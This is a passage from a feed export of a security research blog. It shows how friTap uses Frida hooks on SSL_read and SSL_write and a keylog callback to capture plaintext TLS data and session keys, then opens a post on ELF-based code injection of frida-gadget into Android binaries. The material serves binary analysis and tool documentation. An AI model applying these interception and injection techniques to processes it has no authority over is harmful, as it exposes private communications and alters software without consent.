&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;ssl_session_id&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">getSslSessionId&lt;/span>(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>])
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;function&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;SSL_read&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">message&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">buf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>]
}
...
})
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The pointer to the buffer is in the paramter array named &lt;code>args&lt;/code>, strictly speaking in the second position (it is the second function parameter). This is now saved in the execution context using &lt;code>this.buf = args[1]&lt;/code>, since the buffer will only be filled with the received data after the read function has been executed.&lt;/p>
&lt;p>The hook of the function end has exactly one parameter, the return value of the function. In the case of the read function, this is the number of bytes received, which is important for reading the buffer. The hook for the end of the function looks like the following, again demonstrated with OpenSSL as an example:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#a6e22e">Interceptor&lt;/span>.&lt;span style="color:#a6e22e">attach&lt;/span>(&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;SSL_read&amp;#34;&lt;/span>],
{
...
&lt;span style="color:#a6e22e">onLeave&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">retval&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">any&lt;/span>) {
&lt;span style="color:#a6e22e">retval&lt;/span> &lt;span style="color:#f92672">|=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#75715e">// Cast retval to 32-bit integer.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">retval&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;span style="color:#66d9ef">return&lt;/span>
}
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">buffer_content&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">buf&lt;/span>.&lt;span style="color:#a6e22e">readByteArray&lt;/span>(&lt;span style="color:#a6e22e">retval&lt;/span>)
&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;contentType&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;datalog&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">message&lt;/span>, &lt;span style="color:#a6e22e">buffer_content&lt;/span>)
}
})
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>retval&lt;/code> is the return value of the read function, i.e. the number of bytes received. The previously saved pointer to the buffer can now be read with &lt;code>readByteArray()&lt;/code>. By the return value of the read function friTap knows exactly how many bytes have to be read from the buffer. The extracted bytes are then stored in a dictionary object, which in addition to the data also contains information such as port numbers, sender and receiver addresses, etc. . This is then sent via &lt;code>send()&lt;/code> from the target process to the main script (&lt;a href="https://github.com/fkie-cad/friTap/blob/9ba62ad1aecffb3baed812690b74efe99d970d22/friTap.py">python script&lt;/a>), which then processes this information.&lt;/p>
&lt;h3 id="hooking-the-write-function">Hooking the write function&lt;/h3>
&lt;p>As with the read functions, the write functions have the same function signature for all libraries supported by friTap:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>, &lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>, &lt;span style="color:#66d9ef">int&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The first parameter is a pointer to an SSL object that holds all information about the SSL session being used in the background. This object is used to identify the SSL/TLS stream over which data is sent.
The second parameter is a pointer to a buffer that holds the data to be transmitted, in unencrypted form.
The third parameter specifies how many bytes from the referenced buffer should be sent over the associated SSL/TLS stream.&lt;/p>
&lt;p>Unlike the read function, all information necessary for friTap is already available before function execution. The implementation is again exemplified with the implementation of OpenSSL:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#a6e22e">Interceptor&lt;/span>.&lt;span style="color:#a6e22e">attach&lt;/span>(&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;SSL_write&amp;#34;&lt;/span>],
{
&lt;span style="color:#a6e22e">onEnter&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">args&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">any&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">message&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">getPortsAndAddresses&lt;/span>(&lt;span style="color:#a6e22e">SSL_get_fd&lt;/span>(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]) &lt;span style="color:#a6e22e">as&lt;/span> &lt;span style="color:#a6e22e">number&lt;/span>, &lt;span style="color:#66d9ef">false&lt;/span>, &lt;span style="color:#a6e22e">addresses&lt;/span>)
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;ssl_session_id&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">getSslSessionId&lt;/span>(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>])
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;function&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;SSL_write&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;contentType&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;datalog&amp;#34;&lt;/span>
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">bytesToBeSent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>].&lt;span style="color:#a6e22e">readByteArray&lt;/span>(parseInt(&lt;span style="color:#a6e22e">args&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]))
&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">message&lt;/span>, &lt;span style="color:#a6e22e">bytesToBeSent&lt;/span>)
}
})
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>args[1]&lt;/code> is the pointer to the buffer, &lt;code>args[2]&lt;/code> the number of bytes to send. With &lt;code>readByteArray()&lt;/code> the bytes to send can be copied from the buffer. The extracted bytes are then stored in a dictionary object, which contains besides the data also information like port numbers, sender and receiver address etc.. This is then sent via &lt;code>send()&lt;/code> from the target process to the main script (Python script), which then processes this information.&lt;/p>
&lt;h3 id="key-extraction">Key extraction&lt;/h3>
&lt;p>In addition to hooking the read and write functions, friTap also provides the ability to export all keys created/received during the handshake. These keys can then be used to decrypt encrypted TLS traffic. Wirehsark provides the ability to specify a keylog file that friTap created when the client connected to the server.
The implementation of this functionality varies widely. This is due to the default behavior of the individual libraries, especially depending on the operating system.&lt;/p>
&lt;p>Again, we would like to show an example, based on the implementation of OpenSSL on linux:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">SSL_CTX_set_keylog_callback&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ObjC&lt;/span>.&lt;span style="color:#a6e22e">available&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">NativeFunction&lt;/span>(&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;SSL_CTX_set_info_callback&amp;#34;&lt;/span>], &lt;span style="color:#e6db74">&amp;#34;void&amp;#34;&lt;/span>, [&lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>]) &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">NativeFunction&lt;/span>(&lt;span style="color:#a6e22e">addresses&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;SSL_CTX_set_keylog_callback&amp;#34;&lt;/span>], &lt;span style="color:#e6db74">&amp;#34;void&amp;#34;&lt;/span>, [&lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>])
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">keylog_callback&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">NativeCallback&lt;/span>(&lt;span style="color:#66d9ef">function&lt;/span> (&lt;span style="color:#a6e22e">ctxPtr&lt;/span>, &lt;span style="color:#a6e22e">linePtr&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">NativePointer&lt;/span>) {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">message&lt;/span>&lt;span style="color:#f92672">:&lt;/span> { [&lt;span style="color:#a6e22e">key&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span>]&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">string&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#a6e22e">number&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> } &lt;span style="color:#f92672">=&lt;/span> {}
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;contentType&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;keylog&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">message&lt;/span>[&lt;span style="color:#e6db74">&amp;#34;keylog&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">linePtr&lt;/span>.&lt;span style="color:#a6e22e">readCString&lt;/span>()
&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#a6e22e">message&lt;/span>)
}, &lt;span style="color:#e6db74">&amp;#34;void&amp;#34;&lt;/span>, [&lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;pointer&amp;#34;&lt;/span>])
&lt;/code>&lt;/pre>&lt;/div>&lt;p>If OpenSSL is selected as a dynamically loaded library, many functions are exported by default. Fortunately, the function &lt;code>SSL_CTX_set_keylog_callback&lt;/code> (linux desktop) is also exported. This function gives the user the ability to define a callback function that will be called whenever new key material is generated or received. This function is passed two parameters when it is called: An SSL object associated with the connection and the newly generated or received key material in the form of a string. FRIDA allows you to define your own callback functions, which we did for this use case. friTap creates a new callback function that reads the passed string and stores it in a dictionary object, which is sent to the main script (python script) and processed by it (log or write out).&lt;/p>
&lt;p>In order to register the own callback, the function &lt;code>SSL_CTX_set_keylog_callback&lt;/code> must be called once, before the handshake, with the callback function as parameter. friTap hooks the &lt;code>SSL_new&lt;/code> method for this. This function is called before the handshake, but also after the SSL context has been created, i.e. the binding options have already been set so that the callback function can receive the key material of the subsequent handshake.&lt;/p>
&lt;p>For each operating system, friTap knows the usual library/module and the function that is ultimately responsible for loading the new library. When a new library is loaded into program memory, the name of the new module is checked to see if it matches any of the SSL/TLS library names. If this is the case, the usual read, write and key export functions are hooked.&lt;/p>
&lt;h2 id="special-thanks">Special Thanks&lt;/h2>
&lt;p>We like to thank our colleague Max J. Ufer for his initial work in creating friTap. Further we like to thank Martin Lambertz and Jan-Niclas Hilgert for their feedback while working on friTap. Finally we have to thank Ole André Vadla Ravnås for his tireless efforts in the development of FRIDA.&lt;/p>
&lt;h2 id="getting-started">Getting started&lt;/h2>
&lt;p>friTap can be downloaded here: &lt;a href="https://github.com/fkie-cad/friTap">https://github.com/fkie-cad/friTap&lt;/a>&lt;/p></content></item><item><title>Make Frida Great Again</title><link>https://lolcads.github.io/posts/2022/07/make_frida_great_again/</link><pubDate>Thu, 28 Jul 2022 13:29:30 +0200</pubDate><guid>https://lolcads.github.io/posts/2022/07/make_frida_great_again/</guid><description>Make Frida Great Again In order to analyse binaries on e.g. Android systems, one is offered a plethora of tools to use to figure out what a binary is doing, whether it is malicious or just buggy. One way to figure out the behaviour of a binary is to utilise the strength of dynamic analysis. Under linux, i.e. Android in particular, Frida is a tool that is used for automated instrumentation of binaries, to inspect memory, function calls etc.</description><content>&lt;h1 id="make-frida-great-again">Make Frida Great Again&lt;/h1>
&lt;p>In order to analyse binaries on e.g. Android systems, one is offered a plethora of tools to use to figure out what a binary is doing, whether it is malicious or just buggy. One way to figure out the behaviour of a binary is to utilise the strength of dynamic analysis. Under linux, i.e. Android in particular, &lt;a href="https://frida.re">Frida&lt;/a> is a tool that is used for automated instrumentation of binaries, to inspect memory, function calls etc.&lt;/p>
&lt;p>In this blog post, I will describe how to overcome a main issue of Frida such that Frida is applicable to a broader set of binaries. For that I will give in-depth explanations on the different techniques being used to solve the issue. Also I will showcase the use of a &lt;a href="https://github.com/fkie-cad/ELFbin">python library&lt;/a> that emerged as a result of this issue.&lt;/p>
&lt;h2 id="stumbling-frida---the-issue">Stumbling Frida - The Issue&lt;/h2>
&lt;p>Frida internally uses the &lt;a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">&lt;code>ptrace&lt;/code>&lt;/a> - syscall to attach to running processes. Notice that using &lt;code>ptrace&lt;/code> requires the &lt;code>CAP_SYS_PTRACE&lt;/code> - capability, which is a requirement for tracing arbitrary processes. Thus, an unprivileged user cannot trace e.g. a privileged process. An example is tracing a process on an Android device. If this device is not rooted, then it will not be possible to use &lt;code>ptrace&lt;/code> on arbitrary processes.&lt;/p>
&lt;p>Lets assume that a user is capable of using &lt;code>ptrace&lt;/code> and that user wants to analyse a potentially malicious binary that employs anti-debugging techniques like the following one&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#66d9ef">if&lt;/span> (ptrace(PTRACE_TRACEME, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>) {
&lt;span style="color:#75715e">// traced: nice behaviour
&lt;/span>&lt;span style="color:#75715e">&lt;/span>} &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;span style="color:#75715e">// not traced: evil behaviour
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then Frida can again not be used to analyse all functionality of the process. This is due to the fact that for each tracee there may at most be one tracer.&lt;/p>
&lt;h2 id="frida-gadget">Frida Gadget&lt;/h2>
&lt;p>Of course the developers of Frida are well aware of this issue. Therefore they provide a shared object file called &lt;a href="https://frida.re/docs/gadget/">&lt;em>frida-gadget.so&lt;/em>&lt;/a>(downloaded &lt;a href="https://github.com/frida/frida/releases">here&lt;/a>), which is to be injected manually into the target process. There are different kinds of interaction types that specify how the connection between the &lt;em>frida server&lt;/em> and the &lt;em>frida client&lt;/em> is set up.&lt;/p>
&lt;p>In the following you can see an example of how to use &lt;em>frida-gadget.so&lt;/em> with its default interaction type &lt;em>listen&lt;/em>. First, for the target binary:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">LD_PRELOAD&lt;span style="color:#f92672">=&lt;/span>/path/to/frida-gadget.so /path/to/target
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, in order to e.g. trace syscalls that start with &amp;ldquo;read&amp;rdquo;:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">frida-trace -H 127.0.0.1:27042 -n &lt;span style="color:#e6db74">&amp;#34;Gadget&amp;#34;&lt;/span> -i &lt;span style="color:#e6db74">&amp;#34;read*&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>-H 127.0.0.1:27042: Specifies the frida server to connect to. In this case the server is located on localhost on the default port 27042.&lt;/li>
&lt;li>-n &amp;ldquo;Gadget&amp;rdquo;: Name of the process to attach to. &lt;strong>In this setting, the name of the target process will always be &amp;ldquo;Gadget&amp;rdquo;!&lt;/strong>&lt;/li>
&lt;li>-i &amp;ldquo;read*&amp;quot;: Specifies what function(s) to trace.&lt;/li>
&lt;/ul>
&lt;p>Using &lt;code>LD_PRELOAD&lt;/code> is not practical in all cases as e.g. it cannot be used to instrument an SUID - binary. For a more general solution, we need another approach.&lt;/p>
&lt;h2 id="elf---based-injection">ELF - based Injection&lt;/h2>
&lt;p>The approach used to make a process load &lt;em>frida-gadget.so&lt;/em> at startup is ELF - based injection. In order to support as many platforms as possible, those injection techniques will be based on &lt;a href="http://www.sco.com/developers/gabi/latest/contents.html">System V gABI&lt;/a>. It describes the abstract structure of an ELF - file, occasionally leaving out details to be specified by a corresponding &lt;em>Processor Supplement&lt;/em> (e.g. &lt;a href="https://github.com/ARM-software/abi-aa/releases/download/2022Q1/aaelf64.pdf">ARM64&lt;/a> or &lt;a href="https://gitlab.com/x86-psABIs/x86-64-ABI">AMD64&lt;/a>).&lt;/p>
&lt;p>Unfortunately, it is &lt;strong>not&lt;/strong> possible to fully implement ELF - based injection without using architecture - or OS - dependent information. Thus, the following platform-specific assumptions were made when designing the techniques:&lt;/p>
&lt;ol>
&lt;li>ELF - binary is run on ARM64 and Android: This must currently be ensured, because adjusting virtual addresses and file offsets in the binary enforces patching &lt;a href="http://www.sco.com/developers/gabi/latest/ch4.reloc.html">&lt;em>Relocation Tables&lt;/em>&lt;/a>, which are highly platform - dependent.&lt;/li>
&lt;li>There are no other platform - specific tags for &lt;em>.dynamic&lt;/em> - entries other than&lt;/li>
&lt;li>DT_VERSYM&lt;/li>
&lt;li>DT_VERDEF&lt;/li>
&lt;li>DT_VERNEED&lt;/li>
&lt;li>One of the parsers (see &lt;a href="#rule-of-two">Rule of Two&lt;/a>) is build for AMD64 only. Thus the python library will only work on AMD64. Technically, one can try to make sense of the makefiles and change the compilation such that it supports other architectures aswell.&lt;/li>
&lt;/ol>
&lt;p>ELF - based injection can be split into two (or more) steps:&lt;/p>
&lt;ol>
&lt;li>Code injection: Insert code into binary, i.e. make it available for internal structures.&lt;/li>
&lt;li>Code execution: Make injected code executable, i.e. manipulate structures like entry point such that the injected code will be part of the control flow.&lt;/li>
&lt;/ol>
&lt;p>There is one special technique that cannot be split into two parts: &lt;em>.dynamic&lt;/em> - based injection.&lt;/p>
&lt;h3 id="rule-of-two">Rule of Two&lt;/h3>
&lt;p>The techniques to be explained are implemented in a &lt;a href="https://github.com/fkie-cad/ELFbin">python library&lt;/a>, which mainly uses &lt;a href="https://github.com/lief-project/LIEF">LIEF&lt;/a>. LIEF is a binary parser that among other things supports parsing and manipulating ELF - files. However there is a problem with LIEF, i.e. LIEF desperately tries to keep the binary intact. For that LIEF inserts new memory, shuffles segments around and maybe more when just opening and closing the binary. E.g.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">binary &lt;span style="color:#f92672">=&lt;/span> lief&lt;span style="color:#f92672">.&lt;/span>parse(&lt;span style="color:#e6db74">&amp;#39;/bin/ls&amp;#39;&lt;/span>)
binary&lt;span style="color:#f92672">.&lt;/span>write(&lt;span style="color:#e6db74">&amp;#39;./tmp&amp;#39;&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>will &amp;ldquo;build&amp;rdquo; the binary, i.e. internally calling&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">builder &lt;span style="color:#f92672">=&lt;/span> lief&lt;span style="color:#f92672">.&lt;/span>ELF&lt;span style="color:#f92672">.&lt;/span>Builder(binary)
builder&lt;span style="color:#f92672">.&lt;/span>build()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>which will insert memory (out of nowhere). One could make the hypothesis that LIEF wants to &amp;ldquo;prepare&amp;rdquo; the binary for future manipulation and thus already allocates enough space to support e.g. quick PHT injections.&lt;/p>
&lt;p>Also LIEF does not provide all necessary functionality to implement the techniques described in this post. E.g. LIEF does not support overwriting a PHT - entry without modifying the linked memory.&lt;/p>
&lt;p>To that end, a custom parser is utilised. It supports all necessary functionality that LIEF is lacking or not willing to provide, because it might break correctness. The custom parser, &lt;code>rawelf_injection&lt;/code>, takes the name of a binary as an input and performs the requested operations.&lt;/p>
&lt;p>An issue is that when calling &lt;code>rawelf_injection&lt;/code>, LIEF needs to store the current state of the binary to a temporary file and reparse that file after &lt;code>rawelf_injection&lt;/code> is done. This will result in references to objects, that are related to the state of a LIEF - binary &lt;strong>before&lt;/strong> storing the binary to a file, being invalid after LIEF reparsed the binary.&lt;/p>
&lt;p>Other problems emerging from using two parsers at the same time will be mentioned throughout the following sections.&lt;/p>
&lt;h3 id="code-injection">Code Injection&lt;/h3>
&lt;p>Inserting code into the binary can be as easy as just overwriting existing code in &lt;em>.text&lt;/em> and as hard as inserting a new segment and a corresponding PHT - entry. Interestingly, not all of the following techniques are applicable in a fixed setting, thus the user of &lt;code>ElfInjection&lt;/code> has to know what he/she is doing when performing code injection.&lt;/p>
&lt;p>As &lt;code>rawelf_injection&lt;/code> has been designed w.r.t. the System V gABI, applying it to ELF - files constructed for Android on AARCH64 was assumed to work just out-of-the-box (except for relocations). &lt;code>rawelf_injection&lt;/code> has only been tested on Ubuntu 20.04 LTS on AMD64 up to the date I started applying the techniques to ELF - files run on an Android emulator. Lets first look at an overview of the challenges I experienced before diving into the details:&lt;/p>
&lt;p>&lt;img src="https://lolcads.github.io/2022/07/arm_vs_amd.png" alt="Challenges introduced by new platform">&lt;/p>
&lt;p>Unfortunately, it turns out that &lt;code>rawelf_injection&lt;/code> does not support platform - independent injection techniques, as OS vendors apparently are allowed to deviate partially from the System V gABI. On the other hand, for different architectures, there are different CPU instructions, like e.g. &lt;code>adrp&lt;/code>, that introduce unwanted side effects when inserting new memory.&lt;/p>
&lt;p>So lets list the challenges and then try to solve them:&lt;/p>
&lt;ol>
&lt;li>Inserting new memory into a binary can invalidate cross - references (e.g. &lt;code>adrp&lt;/code>).&lt;/li>
&lt;li>Loadable segments should not overlap (see &lt;a href="https://cs.android.com/android/platform/superproject/+/master:bionic/linker/linker_phdr.cpp;l=80">linker_phdr.cpp&lt;/a> ; user has to ensure that loadables do not overlap)&lt;/li>
&lt;li>Platform - specific ELF patches (adjust &lt;code>rawelf_injection&lt;/code> to AARCH64 processor supplement)&lt;/li>
&lt;li>Dynamic linker (see &lt;a href="#dynsym---based-injection">.dynsym - based injection&lt;/a> for details)&lt;/li>
&lt;/ol>
&lt;h4 id="problem-with-adrp">Problem with &lt;code>adrp&lt;/code>&lt;/h4>
&lt;p>Lets assume we want to inject code into an ARM64 - PIE on Android (API level 31, Pixel 3). Then, using NDK r23b&amp;rsquo;s toolchain (i.e. &lt;code>ndk-build&lt;/code>) to compile the program&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-C" data-lang="C">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">ì&lt;/span>nt &lt;span style="color:#a6e22e">main&lt;/span>() {
puts(&lt;span style="color:#e6db74">&amp;#34;Hello World!&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>there will be at least one &lt;em>.plt&lt;/em> - entry that handles all calls to &lt;code>puts&lt;/code>. The corresponding &lt;em>.plt&lt;/em> - stub may look like this:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ aarch64-linux-gnu-objdump -j .plt -d hello
...
00000000000006a0 &amp;lt;__libc_init@plt-0x20&amp;gt;:
6a0: a9bf7bf0 stp x16, x30, &lt;span style="color:#f92672">[&lt;/span>sp, &lt;span style="color:#75715e">#-16]!&lt;/span>
6a4: b0000010 adrp x16, &lt;span style="color:#ae81ff">1000&lt;/span> &amp;lt;puts@plt+0x920&amp;gt;
6a8: f944a211 ldr x17, &lt;span style="color:#f92672">[&lt;/span>x16, &lt;span style="color:#75715e">#2368]&lt;/span>
6ac: &lt;span style="color:#ae81ff">91250210&lt;/span> add x16, x16, &lt;span style="color:#75715e">#0x940&lt;/span>
6b0: d61f0220 br x17
...
00000000000006e0 &amp;lt;puts@plt&amp;gt;:
6e0: b0000010 adrp x16, &lt;span style="color:#ae81ff">1000&lt;/span> &amp;lt;puts@plt+0x920&amp;gt;
6e4: f944ae11 ldr x17, &lt;span style="color:#f92672">[&lt;/span>x16, &lt;span style="color:#75715e">#2392]&lt;/span>
6e8: &lt;span style="color:#ae81ff">91256210&lt;/span> add x16, x16, &lt;span style="color:#75715e">#0x958&lt;/span>
6ec: d61f0220 br x17
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Notice that &lt;code>adrp&lt;/code> will first compute &lt;code>0x6e0 + 0x1000&lt;/code> and then zero out the least-significant 12 bits (related to page size). Thus &lt;code>x16&lt;/code> will contain &lt;code>0x1000&lt;/code>. Then &lt;code>x17&lt;/code> will contain the value located at address &lt;code>0x1000 + 0x958&lt;/code> (i.e. &lt;code>0x958 = 2392&lt;/code>), which is the second to last &lt;em>.got.plt&lt;/em> - entry, containing the address of the dynamic linker stub (see address &lt;code>0x6a0&lt;/code> in objdump - output):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ readelf --wide --sections hello
&lt;span style="color:#f92672">[&lt;/span>Nr&lt;span style="color:#f92672">]&lt;/span> Name Type Address Off Size ES Flg Lk Inf Al
...
&lt;span style="color:#f92672">[&lt;/span>22&lt;span style="color:#f92672">]&lt;/span> .got.plt PROGBITS &lt;span style="color:#ae81ff">0000000000001930&lt;/span> &lt;span style="color:#ae81ff">000930&lt;/span> &lt;span style="color:#ae81ff">000030&lt;/span> &lt;span style="color:#ae81ff">00&lt;/span> WA &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>
...
$ readelf --wide --hex-dump&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">22&lt;/span> hello
...
